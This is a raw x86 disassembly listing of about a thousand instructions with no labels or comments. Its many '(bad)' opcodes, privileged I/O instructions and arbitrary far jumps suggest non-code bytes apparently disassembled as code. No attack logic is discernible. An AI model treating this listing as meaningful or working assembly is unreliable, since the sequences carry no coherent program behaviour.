  421c2e:	sbb    al,0x90
  421c30:	aas    
  421c31:	add    ah,BYTE PTR [ecx-0x35]
  421c34:	call   0x4a78b886
  421c39:	pushf  
  421c3a:	jmp    0x76942552
  421c3f:	lahf   
  421c40:	inc    eax
  421c41:	dec    edx
  421c42:	les    ecx,FWORD PTR [esi]
  421c44:	call   0x6eca:0x7d0901ef
  421c4b:	shl    bl,1
  421c4d:	rcr    BYTE PTR [eax+0x6684a12a],1
  421c53:	or     al,0x29
  421c55:	mov    ch,0xbf
  421c57:	push   ebx
  421c58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c59:	aam    0x3d
  421c5b:	ficomp DWORD PTR [eax-0x26]
  421c5e:	popa   
  421c5f:	sub    BYTE PTR [eax],ch
  421c61:	cmc    
  421c62:	inc    edx
  421c63:	ret    
  421c64:	retf   
  421c65:	mov    bl,0x90
  421c67:	pop    ebx
  421c68:	sbb    al,0xef
  421c6a:	xchg   esp,eax
  421c6b:	int    0x23
  421c6d:	test   BYTE PTR [ebx-0x1a],ch
  421c70:	test   al,0x21
  421c72:	push   ebp
  421c73:	adc    al,0x28
  421c75:	mov    al,0x5f
  421c77:	push   0x2212920b
  421c7c:	or     ch,ch
  421c7e:	inc    edi
  421c7f:	cmp    BYTE PTR [ecx-0x69],dh
  421c82:	xor    ch,BYTE PTR ds:0xed2030d7
  421c88:	fcmovu st,st(3)
  421c8a:	jp     0x421c6b
  421c8c:	xlat   BYTE PTR ds:[ebx]
  421c8d:	adc    ecx,esi
  421c8f:	mov    eax,0xd8b62139
  421c94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c95:	push   0x50
  421c97:	mov    eax,ds:0x1bf8e2ab
  421c9c:	lock nop
  421c9e:	sub    eax,0x749ed0e8
  421ca3:	out    dx,al
  421ca4:	jo     0x421c89
  421ca6:	adc    al,0xc7
  421ca8:	(bad)  
  421ca9:	fisub  WORD PTR [edi+ebp*4-0x5c]
  421cad:	xchg   ecx,eax
  421cae:	mov    ecx,0xd235b2e9
  421cb3:	jb     0x421ceb
  421cb5:	sbb    ecx,esi
  421cb7:	mov    esi,DWORD PTR [ebx+0x78]
  421cba:	out    0x6c,al
  421cbc:	and    al,0xdb
  421cbe:	adc    BYTE PTR [ebp-0x5c],ah
  421cc1:	jb     0x421d28
  421cc3:	into   
  421cc4:	mov    edx,0x60c55c3e
  421cc9:	in     al,dx
  421cca:	adc    bl,al
  421ccc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ccd:	pop    ecx
  421cce:	pop    ebp
  421ccf:	dec    ebp
  421cd0:	sub    BYTE PTR [ebx-0x391c28ac],bh
  421cd6:	loop   0x421ccf
  421cd8:	aas    
  421cd9:	leave  
  421cda:	gs push ss
  421cdc:	inc    eax
  421cdd:	xchg   edi,eax
  421cde:	mov    ecx,0xac12b529
  421ce3:	xchg   edi,eax
  421ce4:	pop    ss
  421ce5:	xchg   edx,eax
  421ce6:	daa    
  421ce7:	sbb    ch,BYTE PTR [ebp-0x50735e87]
  421ced:	imul   edi,DWORD PTR [ebp+edx*2+0x3f],0xffffffcb
  421cf2:	mov    ebp,0x3fe5a8b3
  421cf7:	and    BYTE PTR ds:0x9fb1f913,ah
  421cfd:	and    edi,esi
  421cff:	push   cs
  421d00:	dec    edx
  421d01:	idiv   DWORD PTR [ebp-0x3f]
  421d04:	cmp    al,0x2d
  421d06:	fdivrp st(4),st
  421d08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d09:	ret    0x7402
  421d0c:	sub    ebx,ebp
  421d0e:	cmp    BYTE PTR [edi-0x17],dl
  421d11:	sub    ch,BYTE PTR [eax]
  421d13:	ins    BYTE PTR es:[edi],dx
  421d14:	xor    DWORD PTR [esi],eax
  421d16:	arpl   WORD PTR [edi+ecx*4+0x35da4037],sp
  421d1d:	int    0xe9
  421d1f:	stc    
  421d20:	cmp    BYTE PTR [ebx],dl
  421d22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d23:	enter  0xce75,0x53
  421d27:	nop
  421d28:	mov    ah,BYTE PTR [ecx-0x61]
  421d2b:	mov    esp,0x1167da3
  421d30:	sbb    al,0x43
  421d32:	jge    0x421cd4
  421d34:	nop
  421d35:	sub    ebp,edi
  421d37:	jo     0x421d18
  421d39:	sub    al,0x9b
  421d3b:	sbb    eax,0x2c998fa5
  421d40:	nop
  421d41:	cmp    BYTE PTR [ebx+ebx*4-0x63],0xc4
  421d46:	cwde   
  421d47:	stc    
  421d48:	sar    DWORD PTR ds:0x803565a5,1
  421d4f:	cmp    edi,esi
  421d51:	inc    esi
  421d52:	inc    esp
  421d53:	lock pop edi
  421d55:	xchg   edi,eax
  421d56:	imul   ebp,DWORD PTR [esi+0x2cfd85ca],0x717b6396
  421d60:	dec    edx
  421d61:	retf   0x22cc
  421d64:	sub    BYTE PTR [eax+0x63f3ffc6],bh
  421d6a:	aaa    
  421d6b:	daa    
  421d6c:	pop    ss
  421d6d:	ss xor ah,0x34
  421d71:	pop    ss
  421d72:	jg     0x421cfd
  421d74:	and    DWORD PTR [ecx+0x39],ebx
  421d77:	cs sbb eax,0xf2075a1a
  421d7d:	cwde   
  421d7e:	popf   
  421d7f:	out    0x9,al
  421d81:	stos   DWORD PTR es:[edi],eax
  421d82:	shl    BYTE PTR [edx],1
  421d84:	fwait
  421d85:	jle    0x421d76
  421d87:	jbe    0x421d96
  421d89:	pop    ss
  421d8a:	xlat   BYTE PTR ds:[ebx]
  421d8b:	nop
  421d8c:	sub    eax,0x41a411fa
  421d91:	inc    ebx
  421d92:	lods   al,BYTE PTR ds:[esi]
  421d93:	int3   
  421d94:	mov    ch,0xd5
  421d96:	adc    DWORD PTR [eax-0x8],ebx
  421d99:	in     al,0xac
  421d9b:	stos   BYTE PTR es:[edi],al
  421d9c:	mov    eax,0x2fa6a9fe
  421da1:	mov    dl,0xbf
  421da3:	je     0x421db7
  421da5:	mov    al,0x24
  421da7:	sbb    BYTE PTR [ecx],al
  421da9:	adc    DWORD PTR [ebx+0x5e],esp
  421dac:	add    eax,0xa5ece2a1
  421db1:	sbb    DWORD PTR [edi+esi*2-0x3aed23ea],esp
  421db8:	dec    ecx
  421db9:	int    0xb7
  421dbb:	ret    
  421dbc:	mov    eax,ds:0xa817f750
  421dc1:	pop    edi
  421dc2:	adc    eax,0x6a854cad
  421dc7:	ss into 
  421dc9:	jle    0x421d54
  421dcb:	pop    eax
  421dcc:	ror    BYTE PTR [edi],1
  421dce:	idiv   DWORD PTR [edx+ecx*4+0x4ced21c4]
  421dd5:	xor    edi,0x19
  421dd8:	cli    
  421dd9:	imul   bp,WORD PTR [edx+0x34f91b51],0xb248
  421de2:	les    esp,FWORD PTR [esi+0x2c103c45]
  421de8:	pop    ebp
  421de9:	add    dl,bl
  421deb:	mov    ds:0x326d893a,al
  421df0:	aaa    
  421df1:	push   ds
  421df2:	ja     0x421dfb
  421df4:	arpl   WORD PTR [ecx-0x527ecd45],sp
  421dfa:	in     eax,dx
  421dfb:	ficom  WORD PTR [ecx-0x5368d86e]
  421e01:	sbb    al,bl
  421e03:	xor    eax,0xc81709eb
  421e08:	or     DWORD PTR es:0x2ea8bdfd,0x926a624a
  421e13:	shl    BYTE PTR [ebx+0x4f5f5f82],0x28
  421e1a:	push   edi
  421e1b:	jnp    0x421dbf
  421e1d:	jne    0x421e92
  421e1f:	hlt    
  421e20:	xor    eax,0xc32e8abe
  421e25:	dec    ecx
  421e26:	mov    bl,0x27
  421e28:	aas    
  421e29:	dec    esp
  421e2a:	cli    
  421e2b:	cmc    
  421e2c:	xor    al,0xfc
  421e2e:	cmp    cl,dl
  421e30:	sahf   
  421e31:	and    al,dl
  421e33:	and    ch,cl
  421e35:	inc    ecx
  421e36:	dec    esp
  421e37:	and    ch,BYTE PTR ds:0x8885b186
  421e3d:	inc    edi
  421e3e:	sub    eax,0x57951131
  421e43:	inc    ecx
  421e44:	loop   0x421e41
  421e46:	inc    eax
  421e47:	hlt    
  421e48:	fistp  QWORD PTR [eax]
  421e4a:	pop    ds
  421e4b:	repz xchg esp,eax
  421e4d:	inc    edi
  421e4e:	out    dx,al
  421e4f:	or     eax,eax
  421e51:	push   cs
  421e52:	popa   
  421e53:	mov    cl,0xf8
  421e55:	push   ebp
  421e56:	push   ds
  421e57:	adc    eax,0x3bffaa83
  421e5c:	mov    esp,0x4a54e5a9
  421e61:	and    dh,BYTE PTR [eax+edx*4]
  421e64:	sub    BYTE PTR [esi+0x660bdb30],bl
  421e6a:	jae    0x421e1a
  421e6c:	jb     0x421e06
  421e6e:	popa   
  421e6f:	push   esp
  421e70:	jecxz  0x421edf
  421e72:	icebp  
  421e73:	sub    eax,0x712570c
  421e78:	ret    0x6eca
  421e7b:	pop    ebx
  421e7c:	retf   0x696e
  421e7f:	loopne 0x421ee8
  421e81:	jae    0x421e1a
  421e83:	call   FWORD PTR ds:0x4111756d
  421e89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e8a:	in     al,0xee
  421e8c:	arpl   WORD PTR [ecx],cx
  421e8e:	retf   
  421e8f:	gs shl eax,cl
  421e92:	mov    al,0xea
  421e94:	fwait
  421e95:	dec    esp
  421e96:	add    BYTE PTR [eax+ecx*2-0x2eb1ccd],dh
  421e9d:	dec    ebx
  421e9e:	pusha  
  421e9f:	les    ebp,FWORD PTR [eax]
  421ea1:	fnstenv [esi]
  421ea3:	push   cs
  421ea4:	dec    ecx
  421ea5:	retf   
  421ea6:	xchg   esp,eax
  421ea7:	xor    BYTE PTR [edi+0x34],ch
  421eaa:	mov    dl,0xd8
  421eac:	and    ah,cl
  421eae:	fstp   QWORD PTR [eax-0x384540c5]
  421eb4:	inc    esi
  421eb5:	enter  0x85fa,0x10
  421eb9:	shrd   DWORD PTR [eax],esp,0xc2
  421ebd:	sbb    bl,ah
  421ebf:	test   ebp,eax
  421ec1:	cmp    BYTE PTR [edx+0x30],dh
  421ec4:	je     0x421f13
  421ec6:	push   edi
  421ec7:	adc    BYTE PTR [ecx-0x21],bh
  421eca:	(bad)  
  421ecb:	adc    ah,BYTE PTR [esi-0x75]
  421ece:	push   ecx
  421ecf:	loopne 0x421e86
  421ed1:	xchg   dl,al
  421ed3:	sub    BYTE PTR [ebx-0x664cda00],bh
  421ed9:	es mov bh,0xba
  421edc:	mov    bh,0xb4
  421ede:	jle    0x421f5d
  421ee0:	inc    esi
  421ee1:	and    eax,0x55385380
  421ee6:	mov    ds:0x1c75c8ea,eax
  421eeb:	push   ecx
  421eec:	pop    ss
  421eed:	repnz aas 
  421eef:	jmp    0xd983:0x626d34ef
  421ef6:	jg     0x421f1f
  421ef8:	add    cl,al
  421efa:	inc    esp
  421efb:	cmp    dl,BYTE PTR ds:0xab8ad0f0
  421f01:	out    dx,eax
  421f02:	retf   0x7da1
  421f05:	mov    eax,0x75fe4a2d
  421f0a:	xchg   ch,dh
  421f0c:	lods   al,BYTE PTR ds:[esi]
  421f0d:	cwde   
  421f0e:	and    eax,0xe53ff25e
  421f13:	lds    esi,FWORD PTR [eax-0x7a]
  421f16:	dec    DWORD PTR [eax+ecx*8+0xc852669]
  421f1d:	loope  0x421f2c
  421f1f:	aad    0xbd
  421f21:	sub    DWORD PTR [ebx-0x3c],esp
  421f24:	mov    cs,WORD PTR [edx]
  421f26:	mov    cl,0x19
  421f28:	cmp    ecx,DWORD PTR [esp+eiz*8-0x23]
  421f2c:	and    eax,0x822fb82a
  421f31:	ds ins BYTE PTR es:[edi],dx
  421f33:	add    al,0x69
  421f35:	es call 0x135b:0x56fca16c
  421f3d:	aaa    
  421f3e:	push   ss
  421f3f:	enter  0xd27c,0x9b
  421f43:	bound  edx,QWORD PTR [edi]
  421f45:	mov    eax,?
  421f47:	fsubrp st(7),st
  421f49:	shr    BYTE PTR [edx+0x624f6795],1
  421f4f:	gs pop ecx
  421f51:	je     0x421ee8
  421f53:	mov    dl,bh
  421f55:	mov    WORD PTR [ebx+edi*8-0x600c8152],cs
  421f5c:	mov    WORD PTR [ebx],cs
  421f5e:	ins    DWORD PTR es:[edi],dx
  421f5f:	rol    DWORD PTR [eax+0x11c67c92],1
  421f65:	mov    dh,BYTE PTR ds:0xd5ee79b9
  421f6b:	mov    dh,0xfc
  421f6d:	das    
  421f6e:	pop    ds
  421f6f:	enter  0x8b11,0x76
  421f73:	or     al,0x68
  421f75:	and    eax,ecx
  421f77:	stc    
  421f78:	outs   dx,BYTE PTR ds:[esi]
  421f79:	loop   0x421f5a
  421f7b:	out    0x8d,al
  421f7d:	jge    0x421fa1
  421f7f:	push   ebx
  421f80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f81:	push   edi
  421f82:	je     0x421f16
  421f84:	mov    ah,BYTE PTR [edx-0x6c8cb7ef]
  421f8a:	jecxz  0x421fdf
  421f8c:	jl     0x421fd3
  421f8e:	sbb    BYTE PTR [eax-0x9232a9e],0x18
  421f95:	(bad)  
  421f96:	int3   
  421f97:	retf   0xf056
  421f9a:	pop    eax
  421f9b:	cmp    DWORD PTR [esi+0x6e613b8],esp
  421fa1:	(bad)  
  421fa2:	repz adc DWORD PTR [edx],ebx
  421fa5:	jae    0x421fef
  421fa7:	or     esi,DWORD PTR [ebp-0x3f]
  421faa:	add    al,0xca
  421fac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421fad:	sub    DWORD PTR [ebx+0x601d090e],ecx
  421fb3:	mov    bl,0x9a
  421fb5:	hlt    
  421fb6:	std    
  421fb7:	out    0xf1,eax
  421fb9:	(bad)  
  421fba:	loopne 0x422024
  421fbc:	inc    ebp
  421fbd:	iret   
  421fbe:	pop    ss
  421fbf:	shr    BYTE PTR [edi],cl
  421fc1:	lahf   
  421fc2:	gs cld 
  421fc4:	fisubr DWORD PTR [ebp-0x1a]
  421fc7:	int    0xf5
  421fc9:	dec    edi
  421fca:	in     al,dx
  421fcb:	aad    0x31
  421fcd:	bound  ecx,QWORD PTR [ecx+0x25224c8a]
  421fd3:	in     al,0xd6
  421fd5:	cli    
  421fd6:	outs   dx,BYTE PTR ds:[esi]
  421fd7:	mov    esi,0xb058cfbe
  421fdc:	(bad)
  421fdf:	(bad)  
  421fe1:	pop    eax
  421fe2:	pop    edx
  421fe3:	mul    DWORD PTR [ebx+edx*2-0x60]
  421fe7:	fcmovnbe st,st(4)
  421fe9:	lfs    ebx,FWORD PTR [ebp-0x2ed705ed]
  421ff0:	xchg   ebx,eax
  421ff1:	or     eax,0x8317db38
  421ff6:	jae    0x421fd3
  421ff8:	cmp    BYTE PTR [esp+ebx*4],ah
  421ffb:	sub    al,0x4f
  421ffd:	and    edi,DWORD PTR [edi-0x5b6dddd6]
  422003:	fs dec esp
  422005:	push   ds
  422006:	dec    BYTE PTR [ebp-0x6922d7e7]
  42200c:	sub    esi,ebp
  42200e:	or     eax,0xa8c63e86
  422013:	inc    esi
  422014:	lea    ecx,[edx+eiz*4+0x5b66bd45]
  42201b:	out    dx,eax
  42201c:	cmp    DWORD PTR [ebx+0x60],edx
  42201f:	sub    BYTE PTR [esi],bl
  422021:	mov    bl,0xa7
  422023:	loopne 0x42206a
  422025:	inc    ebp
  422026:	shr    DWORD PTR [ebx+0x3086af98],0x89
  42202d:	push   0xffffffeb
  42202f:	mov    al,ds:0x613eb50e
  422034:	lahf   
  422035:	ja     0x422057
  422037:	adc    ah,BYTE PTR [edi-0x24]
  42203a:	push   ss
  42203b:	(bad)  
  42203c:	stc    
  42203d:	xor    DWORD PTR [ecx],0x5447e73b
  422043:	jbe    0x42206e
  422045:	jae    0x422022
  422047:	adc    al,0x31
  422049:	mov    dl,0x53
  42204b:	(bad)  
  42204c:	jbe    0x421fff
  42204e:	fbld   TBYTE PTR [edx-0x39]
  422051:	iret   
  422052:	push   0x426a1e93
  422057:	inc    esi
  422058:	int3   
  422059:	pop    ebx
  42205a:	sub    al,0x2
  42205c:	mov    dl,0xd
  42205e:	adc    dl,BYTE PTR [esi]
  422060:	sub    BYTE PTR [eax],cl
  422062:	mov    esp,0x510d5e3b
  422067:	(bad)  
  422068:	addr16 dec ebx
  42206a:	pop    DWORD PTR [ecx]
  42206c:	push   0x58
  42206e:	loope  0x422093
  422070:	stos   BYTE PTR es:[edi],al
  422071:	lods   eax,DWORD PTR ds:[esi]
  422072:	dec    esi
  422073:	or     eax,0x540dcd67
  422078:	pop    ds
  422079:	dec    ecx
  42207a:	dec    ecx
  42207b:	mov    cl,0x50
  42207d:	and    ebx,DWORD PTR ds:0xc2f4cc8c
  422083:	outs   dx,BYTE PTR ds:[esi]
  422084:	sub    bh,BYTE PTR [ecx+0x6c52c6be]
  42208a:	jb     0x422034
  42208c:	mov    ch,0xb2
  42208e:	jno    0x42209e
  422090:	mov    ecx,0x1d0402c
  422095:	mov    ecx,0xe4fc48a3
  42209a:	push   ebx
  42209b:	push   0x3d
  42209d:	cmp    al,0xca
  42209f:	sub    al,0x79
  4220a1:	aam    0x92
  4220a3:	lds    esp,FWORD PTR [edi]
  4220a5:	pop    ebp
  4220a6:	fld    DWORD PTR [edi]
  4220a8:	dec    eax
  4220a9:	fidivr WORD PTR [edx-0x55]
  4220ac:	push   0xffffffec
  4220ae:	mov    DWORD PTR [ecx],0xc7254403
  4220b4:	mov    ah,0xfa
  4220b6:	jmp    0x42207b
  4220b8:	or     bh,BYTE PTR [edx-0x56]
  4220bb:	ja     0x422043
  4220bd:	(bad)  
  4220be:	ds jge 0x422054
  4220c1:	aaa    
  4220c2:	mov    DWORD PTR [eax-0x25630a5d],ebp
  4220c8:	out    dx,eax
  4220c9:	cmp    al,0xef
  4220cb:	mov    bh,0x64
  4220cd:	fld    DWORD PTR cs:[eax]
  4220d0:	pop    edx
  4220d1:	and    BYTE PTR [esi+edi*2+0x1a],bh
  4220d5:	dec    esp
  4220d6:	push   ebp
  4220d7:	adc    eax,DWORD PTR [ebx+esi*1]
  4220da:	call   0x7ebf:0xef9c0920
  4220e1:	cld    
  4220e2:	and    esp,eax
  4220e4:	outs   dx,DWORD PTR ds:[esi]
  4220e5:	cld    
  4220e6:	pop    esi
  4220e7:	popa   
  4220e8:	mov    bh,0x4f
  4220ea:	or     al,0x26
  4220ec:	call   0x80fe:0xf3b8d82c
  4220f3:	sub    DWORD PTR gs:[ebx],ebp
  4220f6:	mov    BYTE PTR [ebx-0x4424e1e2],ah
  4220fc:	and    DWORD PTR [edi],ecx
  4220fe:	mov    bh,0xb5
  422100:	pusha  
  422101:	xchg   esi,eax
  422102:	xchg   edx,eax
  422103:	jg     0x4220d3
  422105:	cli    
  422106:	hlt    
  422107:	mov    dh,0xf8
  422109:	add    DWORD PTR [edi+edx*4-0x4c],ecx
  42210d:	(bad)  
  42210e:	in     al,0x73
  422110:	mov    BYTE PTR [ecx+0x454a7d9],ch
  422116:	or     BYTE PTR [ecx-0x4],dl
  422119:	jg     0x4220bd
  42211b:	dec    edi
  42211c:	push   esp
  42211d:	cs ins DWORD PTR es:[edi],dx
  42211f:	ins    BYTE PTR es:[edi],dx
  422120:	fdivp  st(2),st
  422122:	arpl   WORD PTR [edx],ax
  422124:	add    DWORD PTR [edx+ebx*2-0x4a],0xec834f2e
  42212c:	aam    0xa0
  42212e:	jb     0x4220c3
  422130:	jno    0xb099feb8
  422136:	ins    DWORD PTR es:[edi],dx
  422137:	enter  0x4dc7,0xcc
  42213b:	js     0x4220ef
  42213d:	xchg   esp,eax
  42213e:	or     al,0x8e
  422140:	xor    eax,0x9b497e0d
  422145:	es xchg ebp,eax
  422147:	adc    ecx,DWORD PTR [edx]
  422149:	(bad)  
  42214a:	test   al,0x2
  42214c:	retf   
  42214d:	push   0xffffffee
  42214f:	inc    edx
  422150:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422151:	ret    
  422152:	sbb    eax,0xf6396f57
  422157:	inc    esp
  422158:	pop    ebp
  422159:	cld    
  42215a:	inc    ebp
  42215b:	pop    ecx
  42215c:	push   es
  42215d:	ds repz loopne 0x4221a5
  422161:	dec    ebx
  422162:	adc    al,0x45
  422164:	inc    ebp
  422165:	div    BYTE PTR [esi+ebx*1-0x26]
  422169:	mov    ebx,0x2679e8f0
  42216e:	aam    0x0
  422170:	repnz and DWORD PTR [ebp+0x56],edi
  422174:	or     dh,bl
  422176:	mov    ch,0x18
  422178:	(bad)  
  422179:	cdq    
  42217a:	lahf   
  42217b:	nop
  42217c:	fnstenv [eax]
  42217e:	push   cx
  422180:	cmp    BYTE PTR [edx+0x56],0xa3
  422184:	dec    ebp
  422185:	jnp    0x4221a7
  422187:	dec    ecx
  422188:	mov    edx,0x75b00f2
  42218d:	mov    DWORD PTR [edx+edi*1],ebx
  422190:	xor    bl,BYTE PTR [ebx-0x49b8c927]
  422196:	pop    eax
  422197:	mov    ebp,0x96a5d1d3
  42219c:	xor    dh,BYTE PTR [edx+0x7e01d573]
  4221a2:	jmp    0xc2ed:0xfada5082
  4221a9:	pop    edx
  4221aa:	outs   dx,DWORD PTR ds:[esi]
  4221ab:	add    DWORD PTR [edi],ebx
  4221ad:	fstp   QWORD PTR [ebx+0x37151d4f]
  4221b3:	jno    0x4221ff
  4221b5:	enter  0x1858,0xa0
  4221b9:	test   DWORD PTR [edi],ebp
  4221bb:	call   0x3990ce6a
  4221c0:	mov    dl,0x9d
  4221c2:	popa   
  4221c3:	add    ah,BYTE PTR [esi+0x4e]
  4221c6:	lods   al,BYTE PTR ds:[esi]
  4221c7:	cdq    
  4221c8:	out    0x23,al
  4221ca:	popf   
  4221cb:	sbb    cl,BYTE PTR [ebp+edi*8-0x9]
  4221cf:	inc    esp
  4221d0:	gs lahf 
  4221d2:	scas   eax,DWORD PTR es:[edi]
  4221d3:	adc    al,0x1b
  4221d5:	es inc eax
  4221d7:	add    BYTE PTR [edi+0x4dc63920],bl
  4221dd:	jb     0x422182
  4221df:	jbe    0x42217e
  4221e1:	test   BYTE PTR [edi],0xbe
  4221e4:	ret    0xb568
  4221e7:	leave  
  4221e8:	mov    eax,ds:0xefa6f4ff
  4221ed:	cmc    
  4221ee:	mov    cl,0x72
  4221f0:	push   ebx
  4221f1:	rcl    DWORD PTR [ebx],1
  4221f3:	ins    DWORD PTR es:[edi],dx
  4221f4:	mov    edi,0xfe0c2c8a
  4221f9:	cdq    
  4221fa:	clc    
  4221fb:	leave  
  4221fc:	popf   
  4221fd:	or     ah,bl
  4221ff:	mov    bh,0x72
  422201:	call   0x984f1a54
  422206:	mov    edx,0x7cb9b2e0
  42220b:	sub    DWORD PTR [edx],esi
  42220d:	test   DWORD PTR [eax+0x288aee33],edi
  422213:	fnstenv [ebp-0x3d593dcf]
  422219:	jb     0x422231
  42221b:	push   ds
  42221c:	mov    ah,0xd7
  42221e:	sbb    al,dl
  422220:	sub    ecx,edx
  422222:	cmp    esi,DWORD PTR [ebp+0x11]
  422225:	out    dx,al
  422226:	ret    0xb62c
  422229:	imul   esi,DWORD PTR [ecx]
  42222c:	cmp    eax,0x6541a84f
  422231:	inc    ecx
  422232:	dec    edi
  422233:	cld    
  422234:	not    DWORD PTR [edi-0x49a5f281]
  42223a:	(bad)  
  42223b:	out    dx,eax
  42223c:	push   edi
  42223d:	sar    BYTE PTR [edx],1
  42223f:	repnz dec ebx
  422241:	sbb    DWORD PTR [ecx],ecx
  422243:	xor    cl,BYTE PTR [ebp+0x3b6e67a0]
  422249:	retf   
  42224a:	into   
  42224b:	cmp    BYTE PTR [ebx],bh
  42224d:	in     al,dx
  42224e:	mov    DWORD PTR [ecx+esi*8-0x49],eax
  422252:	inc    eax
  422253:	popf   
  422254:	pop    ecx
  422255:	imul   edx,ebp,0x3b
  422258:	mov    DWORD PTR [eax-0x67d375a3],edi
  42225e:	sub    bh,BYTE PTR [eax+0x5dceaa5b]
  422264:	ret    0x807d
  422267:	out    dx,eax
  422268:	jmp    0x422254
  42226a:	sbb    eax,0xd94f2fb2
  42226f:	js     0x422259
  422271:	push   edx
  422272:	and    DWORD PTR [ebp+0x71],edi
  422275:	lds    edi,FWORD PTR [edx]
  422277:	out    dx,eax
  422278:	cmp    BYTE PTR [ebx+ebx*8+0x24],bh
  42227c:	jae    0x422222
  42227e:	cs je  0x42222b
  422281:	pop    esp
  422282:	or     edi,edi
  422284:	ret    0x467f
  422287:	std    
  422288:	adc    al,0x9b
  42228a:	jp     0x422243
  42228c:	in     al,0xca
  42228e:	jecxz  0x4222a9
  422290:	cwde   
  422291:	or     dh,BYTE PTR [eax]
  422293:	call   0x1e765eaf
  422298:	jmp    0xff6d632f
  42229d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42229e:	jo     0x422315
  4222a0:	sbb    al,0x35
  4222a2:	and    ecx,0x1a
  4222a5:	pop    esi
  4222a6:	push   esp
  4222a7:	dec    edi
  4222a8:	mov    edi,0xc742aa3c
  4222ad:	jmp    0xf2224925
  4222b2:	leave  
  4222b3:	mov    cl,0xf
  4222b5:	mov    WORD PTR ds:0x329c759a,es
  4222bb:	jmp    0x4222d0
  4222bd:	xlat   BYTE PTR ds:[ebx]
  4222be:	push   eax
  4222bf:	push   es
  4222c0:	mov    ah,0xe7
  4222c2:	xchg   BYTE PTR [edi],al
  4222c4:	sbb    al,BYTE PTR [ecx+0x737f5905]
  4222ca:	sub    eax,0xb5a7e0b6
  4222cf:	add    dl,BYTE PTR [eax-0x67]
  4222d2:	mov    dh,0x75
  4222d4:	jmp    0x723:0xf3bedf81
  4222db:	cmp    BYTE PTR ds:0x82bd04bc,0x60
  4222e2:	out    0xdf,al
  4222e4:	mov    ebp,0xd4241db
  4222e9:	pop    edx
  4222ea:	jle    0x422282
  4222ec:	std    
  4222ed:	cli    
  4222ee:	rcl    esi,cl
  4222f0:	test   al,0x49
  4222f2:	adc    DWORD PTR [esi-0x1b193f77],ecx
  4222f8:	adc    ch,BYTE PTR [esi+0x53db2859]
  4222fe:	sar    DWORD PTR [edx+edx*8],1
  422301:	cmp    edx,DWORD PTR [edx]
  422303:	fistp  DWORD PTR [esi+0x195078d8]
  422309:	ds sub eax,0xa268a9e
  42230f:	jmp    FWORD PTR [ecx+0x31]
  422312:	adc    DWORD PTR [ebx+0x54],0x34
  422316:	clc    
  422317:	ins    BYTE PTR es:[edi],dx
  422318:	pop    ds
  422319:	lock xchg al,cl
  42231c:	dec    ecx
  42231d:	enter  0x9437,0x94
  422321:	xchg   esp,eax
  422322:	and    DWORD PTR [eax],edx
  422324:	mov    BYTE PTR ds:0x7f50b6ed,dh
  42232a:	clc    
  42232b:	into   
  42232c:	dec    ebp
  42232d:	mov    ch,BYTE PTR [eax+0x4e95fdc8]
  422333:	mov    cl,0x81
  422335:	jae    0x42234f
  422337:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422338:	mov    esi,0x8901b270
  42233d:	add    ecx,ebx
  42233f:	dec    esi
  422340:	dec    ecx
  422341:	scas   al,BYTE PTR es:[edi]
  422342:	pushf  
  422343:	xor    al,0x66
  422345:	inc    edi
  422346:	test   DWORD PTR [edi+0x6c26531b],ebx
  42234c:	and    DWORD PTR [edx],esp
  42234e:	sub    DWORD PTR [ecx-0x2e2500e8],ecx
  422354:	pop    ecx
  422355:	in     al,0xd4
  422357:	mov    eax,ds:0x2e8a8fba
  42235c:	dec    edi
  42235d:	push   eax
  42235e:	xchg   ebp,eax
  42235f:	(bad)  
  422360:	push   ss
  422361:	mov    edx,0xede7ad92
  422366:	cmp    DWORD PTR gs:[eax-0xb820596],0xffffffc5
  42236e:	loopne 0x422351
  422370:	pop    ebx
  422371:	push   eax
  422372:	sub    BYTE PTR [ebx+ebp*8+0x54],0xc3
  422377:	push   ebx
  422378:	adc    dh,BYTE PTR [edx+0x3c826d53]
  42237e:	std    
  42237f:	inc    esi
  422380:	shl    edx,1
  422382:	ja     0x4223e5
  422384:	cmc    
  422385:	lods   al,BYTE PTR ds:[esi]
  422386:	jmp    0x422333
  422388:	cmc    
  422389:	fld    TBYTE PTR [ebp+0x1734cdc0]
  42238f:	cmp    BYTE PTR [edi],0x76
  422392:	lds    ebp,FWORD PTR [ebx+0x3f]
  422395:	adc    eax,0x35af3b2f
  42239a:	push   cs
  42239b:	iret   
  42239c:	clc    
  42239d:	test   BYTE PTR [edx+0x2bf6450a],ah
  4223a3:	das    
  4223a4:	adc    al,0x3d
  4223a6:	xchg   BYTE PTR [eax-0x33],al
  4223a9:	out    0x2b,eax
  4223ab:	mov    DWORD PTR [ebp+0x7b],edi
  4223ae:	jmp    0x422406
  4223b0:	aam    0x44
  4223b2:	pop    es
  4223b3:	pop    ss
  4223b4:	cld    
  4223b5:	and    DWORD PTR [edi+0x5],eax
  4223b8:	shr    DWORD PTR [ebp-0x38],0x48
  4223bc:	xchg   ecx,eax
  4223bd:	pop    ss
  4223be:	cs xor al,0x1a
  4223c1:	call   0x494d:0xe5830970
  4223c8:	int    0x16
  4223ca:	jmp    0x1da3ea3d
  4223cf:	cdq    
  4223d0:	cdq    
  4223d1:	ror    dh,1
  4223d3:	outs   dx,BYTE PTR ds:[esi]
  4223d4:	adc    al,0x8d
  4223d6:	in     al,0x20
  4223d8:	xchg   DWORD PTR [ecx+edi*8-0x48842a35],esi
  4223df:	fsub   QWORD PTR [ebp+eiz*4+0x562254b9]
  4223e6:	adc    ah,BYTE PTR [eax]
  4223e8:	loopne 0x422432
  4223ea:	cmp    eax,0xb8aaeee7
  4223ef:	lahf   
  4223f0:	push   esp
  4223f1:	pop    esp
  4223f2:	test   DWORD PTR [edi+edx*4],edi
  4223f5:	dec    esp
  4223f6:	into   
  4223f7:	add    eax,0x236c2490
  4223fc:	enter  0xc3d8,0xde
  422400:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
